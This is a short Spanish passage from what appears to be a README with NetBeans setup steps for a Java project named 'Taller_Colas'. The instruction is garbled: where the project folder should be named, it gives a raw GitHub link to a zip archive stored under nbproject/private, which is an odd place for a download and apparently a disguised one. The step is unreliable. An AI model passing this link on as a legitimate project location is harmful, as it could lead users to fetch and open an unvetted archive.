...
2. **Abrir en NetBeans**:
   - Abre NetBeans IDE.
   - Selecciona "File" > "Open Project" y navega hasta la carpeta del proyecto (donde está `https://raw.githubusercontent.com/cristiancrakl/Taller_Colas/main/nbproject/private/Taller-Colas-v2.2.zip`).
   - Abre el proyecto.
